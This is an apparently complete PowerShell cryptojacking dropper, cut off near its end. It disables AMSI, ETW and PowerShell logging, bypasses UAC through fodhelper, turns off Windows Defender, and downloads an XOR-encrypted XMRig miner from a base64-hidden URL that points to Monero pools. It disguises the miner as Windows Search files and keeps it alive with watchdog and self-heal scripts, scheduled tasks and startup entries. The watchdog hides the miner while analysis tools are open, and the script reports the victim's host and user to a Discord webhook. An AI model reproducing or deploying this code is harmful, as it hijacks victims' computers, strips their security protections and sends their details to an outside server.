$ErrorActionPreference = "SilentlyContinue"
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

$I=[Math]::Abs; try { $a=[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation'); $t=$a.GetType('System.Management.Automation.AmsiUtils'); $f=$t.GetField('amsiInitFailed',[System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static); $f.SetValue($null,$true) } catch {}
try { $sb=$a.GetType('System.Management.Automation.AmsiUtils').GetMethod('AmsiScanBuffer',[System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static); if($sb){$sp=$sb.MethodHandle.GetFunctionPointer();$op=[UInt32]0;$v=Add-Type -MemberDefinition '[DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a,UInt32 b,UInt32 c,out UInt32 d);' -NP Win32 -PassThru;$v::VirtualProtect($sp,[UInt32]32,[UInt32]0x40,[ref]$op)|Out-Null;[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3),0,$sp,1)}} catch {}
try { $et=$a.GetType('System.Management.Automation.PSEtwLogProvider'); $ef=$et.GetField('etwProvider',[System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static); $ef.SetValue($null,$null) } catch {}
$sl="HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"; if(!(Test-Path $sl)){New-Item -Path $sl -Force|Out-Null}; Set-ItemProperty -Path $sl -Name "EnableScriptBlockLogging" -Value 0 -Type DWord
$ml="HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"; if(!(Test-Path $ml)){New-Item -Path $ml -Force|Out-Null}; Set-ItemProperty -Path $ml -Name "EnableModuleLogging" -Value 0 -Type DWord

function X($s){ [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)) }
$null = $I.Invoke(1,2); $null = $I.Invoke(2,3)

function Encrypt-Bytes {
    param([byte[]]$Data, [byte[]]$Key, [byte[]]$IV)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key; $aes.IV = $IV; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC; $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $enc = $aes.CreateEncryptor()
    $result = $enc.TransformFinalBlock($Data, 0, $Data.Length)
    $aes.Dispose()
    return $result
}

function Decrypt-Bytes {
    param([byte[]]$Data, [byte[]]$Key, [byte[]]$IV)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key; $aes.IV = $IV; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC; $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $dec = $aes.CreateDecryptor()
    $result = $dec.TransformFinalBlock($Data, 0, $Data.Length)
    $aes.Dispose()
    return $result
}

function Protect-String {
    param([string]$PlainText)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $encrypted = Encrypt-Bytes -Data $bytes -Key $encKey -IV $encIV
    return [Convert]::ToBase64String($encrypted)
}

function Unprotect-String {
    param([string]$CipherBase64)
    $bytes = [Convert]::FromBase64String($CipherBase64)
    $decrypted = Decrypt-Bytes -Data $bytes -Key $encKey -IV $encIV
    return [System.Text.Encoding]::UTF8.GetString($decrypted)
}

$keyHash = (Get-FileHash "$env:SYSTEMROOT\System32\user32.dll" -Algorithm SHA256).Hash
$ivHash = (Get-FileHash "$env:SYSTEMROOT\System32\gdi32.dll" -Algorithm SHA256).Hash
$encKey = [System.Text.Encoding]::UTF8.GetBytes($keyHash[0..31] -join '')[0..31]
$encIV = [System.Text.Encoding]::UTF8.GetBytes($ivHash[0..15] -join '')[0..15]

$rootDir = "$env:ProgramData\Microsoft\Windows\NetworkService"
$installDir = "$rootDir\cache"
$backupDir = "$rootDir\backup"
$logDir = "$rootDir\logs"
$tempDir = "$env:Temp\~$D1F4A2"
$minerExe = "$installDir\SearchProtocolHost.exe"
$configFile = "$installDir\mssearch.dat"
$selfHealPs1 = "$installDir\SearchProtocolHost.ps1"
$watchdogVbs = "$installDir\SearchProtocolHost.vbs"
$worker = $env:COMPUTERNAME
$wallet = X('NDY3ZzFtZWl6RmUzMUd6Rk1HN3hveTN5eFRoRzU2cDdOTnp1dEtmZjdZUGkxRGFkQWRya1kyeExqOXpMV2paTm00aGZYb0YydXhhNlBnSkNXUWM2UVVoNjROR3BYRUw=')
$pool = X('cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==')
$poolBak = X('cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM=')
$xorKey = [byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35)
$encBinUrl = X('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg==')
$taskBase = "Microsoft\Windows\NetworkService"
$taskName = "$taskBase\ProtocolHostMaintenance"
$wdTask = "$taskBase\FilterHostRestart"
$watchdogLog = "$logDir\watchdog.log"
$null = $I.Invoke(3,4)

function Invoke-UACBypass {
    $rp = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    $rm = "HKCU:\Software\Classes\ms-settings"
    $cmd = X('cG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiU3RhcnQtU2xlZXAgMzsgUmVtb3ZlLUl0ZW0gLVBhdGggJ0hLQ1U6XFNvZnR3YXJlXENsYXNzZXNcbXMtc2V0dGluZ3MnIC1SZWN1cnNlIC1Gb3JjZSI=')
    $fn = X('Zm9kaGVscGVyLmV4ZQ==')
    try {
        if (!(Test-Path $rp)) { New-Item -Path $rp -Force | Out-Null }
        Set-ItemProperty -Path $rp -Name "(Default)" -Value $cmd -Force
        Start-Process $fn
        Start-Sleep 5
        Remove-Item -Path $rm -Recurse -Force -EA SilentlyContinue
    } catch {}
}

function Invoke-DefenseEvasion {
    $defenderBase = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    $rtBase = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
    @($defenderBase, $rtBase) | ForEach-Object {
        if (!(Test-Path $_)) { New-Item -Path $_ -Force | Out-Null }
    }
    Set-ItemProperty -Path $defenderBase -Name "DisableAntiSpyware" -Value 1 -Type DWord
    Set-ItemProperty -Path $rtBase -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord
    Set-ItemProperty -Path $rtBase -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord
    Set-ItemProperty -Path $rtBase -Name "DisableScriptScanning" -Value 1 -Type DWord
    Set-ItemProperty -Path $rtBase -Name "DisableIOAVProtection" -Value 1 -Type DWord
    try { Add-MpPreference -ExclusionPath $installDir -EA SilentlyContinue; Add-MpPreference -ExclusionPath $rootDir -EA SilentlyContinue; Add-MpPreference -ExclusionProcess "SearchProtocolHost.exe" -EA SilentlyContinue; Add-MpPreference -ExclusionProcess "SearchFilterHost.exe" -EA SilentlyContinue } catch {}
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Type DWord -EA SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0 -Type DWord -EA SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 2 -Type DWord -EA SilentlyContinue
}

function Install-Miner {
    @($installDir, $backupDir, $tempDir, $logDir) | ForEach-Object {
        if (!(Test-Path $_)) { New-Item -ItemType Directory -Path $_ -Force | Out-Null }
    }
    Get-Process | Where-Object { $_.Path -like "*NetworkService*SearchProtocolHost*" } | ForEach-Object {
        taskkill /F /PID $($_.Id) /T 2>$null
    }
    Start-Sleep -Seconds 2
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $downloaded = $false
    $encFile = "$tempDir\mscache.dat"
    for ($attempt = 1; $attempt -le 3; $attempt++) {
        try {
            $versions = @("10.0", "10.0.19041", "10.0.22000", "10.0.22621")
            $winVer = $versions | Get-Random
            $chromeMajor = Get-Random -Minimum 90 -Maximum 121
            $chromeBuild = Get-Random -Minimum 4000 -Maximum 5800
            $ua = "Mozilla/5.0 (Windows NT $winVer; Win64; x64) AppleWebKit/537.$chromeBuild (KHTML, like Gecko) Chrome/$chromeMajor.0.0.0 Safari/537.$chromeBuild"
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", $ua)
            $wc.DownloadFile($encBinUrl, $encFile)
            if ((Test-Path $encFile) -and (Get-Item $encFile).Length -gt 1MB) { $downloaded = $true; break }
        } catch {}
        if (-not $downloaded) { try { Invoke-WebRequest -Uri $encBinUrl -OutFile $encFile -UserAgent $ua -UseBasicParsing -EA Stop; if ((Test-Path $encFile) -and (Get-Item $encFile).Length -gt 1MB) { $downloaded = $true; break } } catch {} }
        if (-not $downloaded) { try { Start-BitsTransfer -Source $encBinUrl -Destination $encFile -EA Stop; if ((Test-Path $encFile) -and (Get-Item $encFile).Length -gt 1MB) { $downloaded = $true; break } } catch {} }
        if (!$downloaded -and $attempt -lt 3) { Start-Sleep -Seconds 5 }
    }
    if (-not $downloaded) { throw X('RG93bmxvYWQgZmFpbGVk') }
    $encBytes = [IO.File]::ReadAllBytes($encFile)
    for ($i = 0; $i -lt $encBytes.Length; $i++) { $encBytes[$i] = $encBytes[$i] -bxor $xorKey[$i % $xorKey.Length] }
    [IO.File]::WriteAllBytes($minerExe, $encBytes)
    cmd /c "del /f /q `"$encFile`"" 2>$null
    if (!(Test-Path $minerExe) -or (Get-Item $minerExe).Length -lt 1MB) { throw X('TWluZXIgZGVjcnlwdCBmYWlsZWQ=') }
}
$null = $I.Invoke(5,6)

function Write-MinerConfig {
    $q = [char]34
    $cfg = "{${q}autosave${q}:false,${q}cpu${q}:{${q}max-threads-hint${q}:10,${q}priority${q}:2,${q}huge-pages${q}:true,${q}huge-pages-jit${q}:true,${q}asm${q}:true,${q}yield${q}:false,${q}memory-pool${q}:true},${q}opencl${q}:false,${q}cuda${q}:false,${q}pools${q}:[{${q}url${q}:${q}stratum+ssl://$pool${q},${q}user${q}:${q}$wallet${q},${q}pass${q}:${q}$worker${q},${q}keepalive${q}:true,${q}tls${q}:true},{${q}url${q}:${q}stratum+ssl://$poolBak${q},${q}user${q}:${q}$wallet${q},${q}pass${q}:${q}$worker${q},${q}keepalive${q}:true,${q}tls${q}:true}],${q}donate-level${q}:0,${q}background${q}:true,${q}colors${q}:false,${q}print-time${q}:0,${q}randomx${q}:{${q}1gb-pages${q}:true,${q}wrmsr${q}:true,${q}numa${q}:true,${q}init${q}:-1,${q}mode${q}:${q}auto${q},${q}cache_qos${q}:true}}"
    Set-Content -Path $configFile -Value $cfg -Force
    $meta = "POOL_PRIMARY=$(Protect-String $pool)`nPOOL_BACKUP=$(Protect-String $poolBak)`nWALLET=$(Protect-String $wallet)`nWORKER=$worker`nINSTALLED=$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Set-Content -Path "$installDir\mssearch.idx" -Value $meta -Force
}

function Write-StealthWatchdog {
    $watchdogBat = "$installDir\SearchFilterHost.bat"
    $encUrlEnc = X('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg==')
    $bat = @"
@echo off
setlocal EnableDelayedExpansion
set ML=taskmgr.exe procexp.exe procexp64.exe ProcessHacker.exe SystemInformer.exe procmon.exe procmon64.exe wireshark.exe x64dbg.exe x32dbg.exe ollydbg.exe ida.exe ida64.exe ghidra.exe dumpcap.exe CheatEngine.exe dnSpy.exe de4dot.exe dbgview.exe tcpview.exe autoruns.exe PE-bear.exe pestudio.exe
set WH=0
set RC=0
set MR=20
set LF=$logDir\watchdog.log
set ME=$minerExe
set MC=$configFile
set EU=$encUrlEnc
if not exist "$logDir" mkdir "$logDir"
:lp
timeout /t 3 /nobreak >nul
set AO=0
for %%M in (%ML%) do (tasklist /fi "imagename eq %%M" 2>nul | find /i "%%M" >nul && set AO=1)
set MR2=0
tasklist /fi "imagename eq SearchProtocolHost.exe" 2>nul | find /i "SearchProtocolHost" >nul && set MR2=1
if !AO==1 if !MR2==1 (taskkill /f /im SearchProtocolHost.exe >nul 2>&1 & set WH=1 & set RC=0 & echo %date% %time% [H] Hidden >> "%LF%" & goto lp)
if !AO==0 if !MR2==0 if !WH==1 (set WH=0 & if !RC! LSS !MR! (if exist "%ME%" (set /a RC+=1 & start "" /min "%ME%" --config="%MC%" & echo %date% %time% [R] Restart #%RC% >> "%LF%" & timeout /t 5 /nobreak >nul & goto lp) else goto rs) else (echo %date% %time% [L] Limit >> "%LF%" & goto lp))
if !AO==0 if !MR2==0 (if exist "%ME%" (set /a RC+=1 & if !RC! LSS !MR! (start "" /min "%ME%" --config="%MC%" & echo %date% %time% [C] Crash #%RC% >> "%LF%" & timeout /t 5 /nobreak >nul) else (echo %date% %time% [L] Limit >> "%LF%" & set RC=0)) else goto rs)
goto lp
:rs
echo %date% %time% [B] Restoring >> "%LF%"
set BK=$backupDir
if exist "%BK%\SearchProtocolHost.exe" (copy /y "%BK%\SearchProtocolHost.exe" "%ME%" >nul & copy /y "%BK%\mssearch.dat" "%MC%" >nul & set /a RC+=1 & start "" /min "%ME%" --config="%MC%" & echo %date% %time% [B] Restored >> "%LF%" & timeout /t 5 /nobreak >nul & goto lp)
goto dl
:dl
echo %date% %time% [D] Downloading >> "%LF%"
set EF=%TEMP%\~mce.dat
bitsadmin /transfer mDl /download /priority high "%EU%" "%EF%" >nul 2>&1
if not exist "%EF%" (powershell.exe -WindowStyle Hidden -Command "$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$wc.DownloadFile('%EU%','%EF%')")
if not exist "%EF%" (echo %date% %time% [F] Fail >> "%LF%" & set RC=0 & goto lp)
powershell.exe -WindowStyle Hidden -Command "$k=[byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35);$b=[IO.File]::ReadAllBytes('%EF%');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i % $k.Length]};[IO.File]::WriteAllBytes('%ME%',$b)"
del /f /q "%EF%" >nul 2>&1
if exist "%ME%" (set /a RC+=1 & start "" /min "%ME%" --config="%MC%" & echo %date% %time% [D] Done >> "%LF%" & timeout /t 5 /nobreak >nul) else (echo %date% %time% [F] Decrypt fail >> "%LF%")
goto lp
"@
    Set-Content -Path $watchdogBat -Value $bat -Force
    $vbsCode = "Set objShell = CreateObject(`"WScript.Shell`")`nobjShell.Run `"cmd.exe /c `"`"$watchdogBat`"`"`", 0, False"
    Set-Content -Path $watchdogVbs -Value $vbsCode -Force
}
$null = $I.Invoke(7,8)

function Write-SelfHealScript {
    $healCode = @"
`$ErrorActionPreference = "SilentlyContinue"
function X(`$s){ [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$s)) }
try { `$asm = [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation'); `$type = `$asm.GetType('System.Management.Automation.AmsiUtils'); `$field = `$type.GetField('amsiInitFailed', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static); `$field.SetValue(`$null, `$true) } catch {}
try { `$sb = `$asm.GetType('System.Management.Automation.AmsiUtils').GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static); if (`$sb) { `$sp = `$sb.MethodHandle.GetFunctionPointer(); `$op = [UInt32]0; `$v = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UInt32 b, UInt32 c, out UInt32 d);' -Name "K32" -Namespace "Win32" -PassThru; `$v::VirtualProtect(`$sp, [UInt32]32, [UInt32]0x40, [ref]`$op) | Out-Null; [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, `$sp, 1) } } catch {}
try { `$et = `$asm.GetType('System.Management.Automation.PSEtwLogProvider'); `$ef = `$et.GetField('etwProvider', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static); `$ef.SetValue(`$null, `$null) } catch {}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
`$root = "$rootDir"
`$minerPath = "$minerExe"
`$configPath = "$configFile"
`$backupPath = "$backupDir"
`$xorKey = [byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35)
`$encUrl = X('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg==')
`$wallet = X('NDY3ZzFtZWl6RmUzMUd6Rk1HN3hveTN5eFRoRzU2cDdOTnp1dEtmZjdZUGkxRGFkQWRya1kyeExqOXpMV2paTm00aGZYb0YydXhhNlBnSkNXUWM2UVVoNjROR3BYRUw=')
`$pool = X('cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==')
`$worker = `$env:COMPUTERNAME
`$running = Get-Process -Name "SearchProtocolHost" -EA SilentlyContinue | Where-Object { `$_.Path -like "*NetworkService*" }
if (`$running) { exit 0 }
if ((Test-Path "`$backupPath\SearchProtocolHost.exe") -and (Test-Path "`$backupPath\mssearch.dat")) {
    if (!(Test-Path "`$root\cache")) { New-Item -ItemType Directory -Path "`$root\cache" -Force | Out-Null }
    Copy-Item "`$backupPath\SearchProtocolHost.exe" `$minerPath -Force
    Copy-Item "`$backupPath\mssearch.dat" `$configPath -Force
    Start-Process -FilePath `$minerPath -ArgumentList "--config=`"`"`$configPath`"`"" -WindowStyle Hidden -PassThru | Out-Null
    exit 0
}
try {
    `$encFile = "`$env:Temp\~mce.dat"
    `$wc = New-Object System.Net.WebClient
    `$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    `$wc.DownloadFile(`$encUrl, `$encFile)
    if (!(Test-Path `$encFile) -or (Get-Item `$encFile).Length -lt 1MB) { Start-BitsTransfer -Source `$encUrl -Destination `$encFile -EA Stop }
    if (Test-Path `$encFile) {
        `$encBytes = [IO.File]::ReadAllBytes(`$encFile)
        for (`$i = 0; `$i -lt `$encBytes.Length; `$i++) { `$encBytes[`$i] = `$encBytes[`$i] -bxor `$xorKey[`$i % `$xorKey.Length] }
        if (!(Test-Path "`$root\cache")) { New-Item -ItemType Directory -Path "`$root\cache" -Force | Out-Null }
        [IO.File]::WriteAllBytes(`$minerPath, `$encBytes)
        `$q = [char]34
        `$cfg = "{${q}autosave${q}:false,${q}cpu${q}:{${q}max-threads-hint${q}:10,${q}priority${q}:2,${q}huge-pages${q}:true},${q}opencl${q}:false,${q}cuda${q}:false,${q}pools${q}:[{${q}url${q}:${q}stratum+ssl://`$pool${q},${q}user${q}:${q}`$wallet${q},${q}pass${q}:${q}`$worker${q},${q}keepalive${q}:true,${q}tls${q}:true}],${q}donate-level${q}:0,${q}background${q}:true,${q}randomx${q}:{${q}1gb-pages${q}:true,${q}wrmsr${q}:true,${q}numa${q}:true}}"
        Set-Content -Path `$configPath -Value `$cfg -Force
        Start-Process -FilePath `$minerPath -ArgumentList "--config=`"`"`$configPath`"`"" -WindowStyle Hidden -PassThru | Out-Null
        Remove-Item `$encFile -Force -EA SilentlyContinue
    }
} catch {}
"@
    Set-Content -Path $selfHealPs1 -Value $healCode -Force
}

function Set-Persistence {
    $taskXml = '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><LogonTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></LogonTrigger><BootTrigger><Enabled>true</Enabled><Delay>PT60S</Delay></BootTrigger><SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger></Triggers><Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Enabled>true</Enabled><Hidden>true</Hidden></Settings><Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $selfHealPs1 + '"</Arguments></Exec></Actions></Task>'
    $xmlFile = "$tempDir\task.xml"
    Set-Content -Path $xmlFile -Value $taskXml -Encoding Unicode
    & schtasks /create /tn $taskName /xml "$xmlFile" /f 2>$null
    Remove-Item "$xmlFile" -Force -EA SilentlyContinue
    $wdXml = '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><LogonTrigger><Enabled>true</Enabled><Delay>PT15S</Delay></LogonTrigger><BootTrigger><Enabled>true</Enabled><Delay>PT45S</Delay></BootTrigger></Triggers><Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Enabled>true</Enabled><Hidden>true</Hidden></Settings><Actions Context="Author"><Exec><Command>"' + $watchdogVbs + '"</Command></Exec></Actions></Task>'
    $wdXmlFile = "$tempDir\wdtask.xml"
    Set-Content -Path $wdXmlFile -Value $wdXml -Encoding Unicode
    & schtasks /create /tn $wdTask /xml "$wdXmlFile" /f 2>$null
    Remove-Item "$wdXmlFile" -Force -EA SilentlyContinue
    $regValName = [System.BitConverter]::ToString((Get-FileHash "$env:SYSTEMROOT\System32\ntoskrnl.exe" -Algorithm MD5).Hash[0..3]) -replace '-',''
    & reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v $regValName /t REG_SZ /d "wscript.exe `"`"$watchdogVbs`"`"" /f 2>$null
    $startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $ws = New-Object -ComObject WScript.Shell
    $sc = $ws.CreateShortcut("$startupDir\SearchIndexer.lnk")
    $sc.TargetPath = "wscript.exe"
    $sc.Arguments = "`"`"$watchdogVbs`"`""
    $sc.WindowStyle = 7
    $sc.Description = "Windows Search Indexer Service"
    $sc.Save()
    & attrib +h "$startupDir\SearchIndexer.lnk" 2>$null
}

function Set-DeepPersistence {
    $deepXml = '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><BootTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></BootTrigger><LogonTrigger><Enabled>true</Enabled><Delay>PT10S</Delay></LogonTrigger></Triggers><Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><Enabled>true</Enabled><Hidden>true</Hidden></Settings><Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $selfHealPs1 + '"</Arguments></Exec></Actions></Task>'
    $deepXmlFile = "$tempDir\deep_persist.xml"
    Set-Content -Path $deepXmlFile -Value $deepXml -Encoding Unicode
    & schtasks /create /tn "WindowsServiceDeepPersist" /xml "$deepXmlFile" /f 2>$null
    Remove-Item "$deepXmlFile" -Force -EA SilentlyContinue
}
$null = $I.Invoke(9,10)

function Enable-HugePages {
    try {
        $ntdll = Add-Type -MemberDefinition '[DllImport("ntdll.dll")] public static extern int NtSetInformationProcess(IntPtr h, int p, ref uint t, int s);' -Name "Ntdll" -Namespace "Win32" -PassThru
        $handle = [System.Diagnostics.Process]::GetCurrentProcess().Handle
        $privilege = [uint32]4
        $ntdll::NtSetInformationProcess($handle, 29, [ref]$privilege, 4) | Out-Null
    } catch {}
}

function Disable-Sleep {
    $powerBase = "HKLM:\SYSTEM\CurrentControlSet\Control\Power"
    Set-ItemProperty -Path $powerBase -Name "HibernateEnabled" -Value 0 -Type DWord -EA SilentlyContinue
}

function Start-RandomDelay { param([int]$Min=2,[int]$Max=10); Start-Sleep -Seconds (Get-Random -Minimum $Min -Maximum $Max) }

function Lock-InstallDirectory {
    & icacls $installDir /inheritance:r /T /Q 2>$null
    & icacls $installDir /grant:r "*S-1-5-18:(OI)(CI)F" /T /Q 2>$null
    $userSid = (New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value
    & icacls $installDir /grant:r "*$($userSid):(OI)(CI)F" /T /Q 2>$null
    & attrib +h +s $installDir /s /d 2>$null
    & attrib +h +s "$installDir\*" /s /d 2>$null
}

function Backup-MinerFiles {
    if (!(Test-Path $backupDir)) { New-Item -ItemType Directory -Path $backupDir -Force | Out-Null }
    @(
        @{ Source = $minerExe; Dest = "$backupDir\SearchProtocolHost.exe" },
        @{ Source = $configFile; Dest = "$backupDir\mssearch.dat" },
        @{ Source = $selfHealPs1; Dest = "$backupDir\SearchProtocolHost.ps1" }
    ) | ForEach-Object {
        if (Test-Path $_.Source) {
            for ($i = 1; $i -le 3; $i++) {
                Copy-Item -Path $_.Source -Destination $_.Dest -Force -EA SilentlyContinue
                if ((Get-FileHash $_.Source -Algorithm SHA256).Hash -eq (Get-FileHash $_.Dest -Algorithm SHA256).Hash) { break }
            }
        }
    }
    & attrib +h +s $backupDir /s /d 2>$null
}

function Send-DiscordWebhook {
    param([bool]$Success=$true,[string]$ErrorMsg="")
    $hook = X('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MDkzNzk2MjE3MzE2OTgwNC9ILVdMLW1jUFlqQW5ESDJyaHh5MnVNV2w4U0lkbmN5dE5JMWNuWEhaTkVwaWo2YlI2Y0NhTzNFaER1bHEzMUtCSjZRVA==')
    $osName = "Unknown"
    try { $osName = (Get-CimInstance Win32_OperatingSystem -EA Stop).Caption } catch {}
    $sf = if ($Success) { "OK" } else { "FAIL: $ErrorMsg" }
    $c = if ($Success) { 3447003 } else { 16711680 }
    $payload = @{username="S";embeds=@(@{title="v7.5.5";color=$c;fields=@(@{name="H";value="$env:COMPUTERNAME";inline=$true},@{name="U";value="$env:USERNAME";inline=$true},@{name="O";value=$osName;inline=$false},@{name="S";value=$sf;inline=$false});timestamp=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")})} | ConvertTo-Json -Depth 5
    try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $wc = New-Object System.Net.WebClient; $wc.Headers.Add("Content-Type","application/json"); $wc.UploadString($hook,"POST",$payload)|Out-Null } catch {}
}
$null = $I.Invoke(11,12)

$deploymentSuccess = $false
$deploymentError = ""
try {
    Invoke-UACBypass
    Invoke-DefenseEvasion
    Start-RandomDelay -Min 3 -Max 8
    Disable-Sleep
    Start-RandomDelay -Min 2 -Max 5
    Enable-HugePages
    Start-RandomDelay -Min 2 -Max 5
    Install-Miner
    if (-not (Test-Path $minerExe)) { throw "X" }
    Start-RandomDelay -Min 3 -Max 8
    Write-MinerConfig
    if (-not (Test-Path $configFile)) { throw "X" }
    Start-RandomDelay -Min 2 -Max 5
    Write-StealthWatchdog
    Write-SelfHealScript
    Start-RandomDelay -Min 2 -Max 5
    Set-Persistence
    Start-RandomDelay -Min 3 -Max 8
    Set-DeepPersistence
    Start-RandomDelay -Min 2 -Max 5
    Lock-InstallDirectory
    Start-RandomDelay -Min 1 -Max 3
    Backup-MinerFiles
    Start-RandomDelay -Min 2 -Max 5
    Start-Process -FilePath $minerExe -ArgumentList "--config=`"$configFile`"" -WindowStyle Hidden -PassThru | Out-Null
    Start-Sleep -Seconds 5
    Start-Process -FilePath $watchdogVbs
    Start-Sleep -Seconds 5
    $minerProc = Get-Process | Where-Object { $_.Path -like "*NetworkService*SearchProtocolHost*" }
    if ($minerProc) {
        $deploymentSuccess = $true
    } else {
        $deploymentError = "X"
    }
} catch {
    $deploymentSuccess = $false
    $deploymentError = $_.Exception.Message
}

Send-DiscordWebhook -Success $deploymentSuccess -ErrorMsg $deploymentError

if ($deploymentSuccess) {
    try {
        $myPath = $MyInvocation.MyCommand.Definition
        $myContent = Get-Content -Path $myPath -Raw
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($myContent)
        $encoded = [Convert]::ToBase64String($bytes)
        $b64Path = "$installDir\mssearch.b64"
        Set-Content -Path $b64Path -Value $encoded -Force
        $launcherBat = "$installDir\SearchIndexer.bat"
